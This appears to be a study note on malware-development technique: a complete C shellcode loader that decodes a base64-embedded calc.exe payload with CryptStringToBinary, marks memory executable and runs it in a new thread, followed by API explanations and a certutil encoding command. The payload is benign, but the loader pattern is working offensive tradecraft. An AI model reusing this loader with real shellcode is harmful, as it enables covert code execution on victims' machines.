

Code snippet
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int calc_len = sizeof(calc_payload);


int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	// Allocate new memory buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decode the payload back to binary form
	DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, execute!
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```


---

#### Key Windows API functions

Windows API provides functions to encode and decode Base64 data. Two common functions for this purpose are `CryptBinaryToString()` and `CryptStringToBinary()`, which are part of the Cryptography API.

[**_CryptStringToBinary()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya) converts a formatted string into an array of bytes. This function can be found in the _crypt32.dll_ library.

`CryptStringToBinary()` function has the following prototype:

```c
BOOL CryptStringToBinary(
  LPCSTR pszString,  // pointer to a string that contains the formatted string to be converted.
  DWORD  cchString,  // number of characters of the formatted string to be converted, not including the terminating NULL
  DWORD  dwFlags,    // indicates the format of the string to be converted, ex. CRYPT_STRING_BASE64, CRYPT_STRING_HEXASCII, CRYPT_STRING_BINARY, etc.
  BYTE   *pbBinary,  // pointer to a buffer that receives the returned sequence of bytes
  DWORD  *pcbBinary, // pointer to a variable which on entry contains the size of the pbBinary (in bytes). After return, it contains the number of bytes copied to the buffer
  DWORD  *pdwSkip,   // pointer to a value that receives the number of characters skipped to reach the beginning of the -----BEGIN ...----- header
  DWORD  *pdwFlags   // pointer to a value that receives the flags actually used in the conversion. Can be NULL (skipped)
);
```

 **Return value**

If the function succeeds, the return value is nonzero (`TRUE`). Otherwise, the return value is zero (`FALSE`).

**`LPCSTR` = “Long Pointer to Constant String” = `const char *`**

```c
typedef const char *LPCSTR;
```

|Part|Meaning|
|---|---|
|**LP**|"Long Pointer" (historical — just means pointer now)|
|**C**|`const` (read-only)|
|**STR**|string (specifically, an ANSI string — one byte per character)|

##### External Resources

[Base64 Encode and Decode in C](https://nachtimwald.com/2017/11/18/base64-encode-and-decode-in-c/)


---

#### Base64 Decoder Function using CryptStringToBinary

```c
int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}
```

- `BYTE` on Windows is `typedef unsigned char BYTE;`
- `calc_payload` is declared `unsigned char calc_payload[] = "..."`; that is _exactly_ compatible with `BYTE[]`, so **no cast is strictly necessary** in plain C when passing `calc_payload` to a parameter of type `const BYTE *`
- The `const` part expresses intent: the function promises **not to modify** the source buffer. That’s good practice.
  
  - `VirtualAlloc` returns a `void *` (`exec_mem`). In C, a `void *` can be passed to any object pointer _without_ a cast — but many developers still cast it explicitly (e.g. `(char *)exec_mem`) to make the conversion obvious or to avoid warnings when compiling as C++.

---

#### B64 conversion

Base64 encode bin shellcode
```powershell
certutil -encode calc.bin calc.b64
```

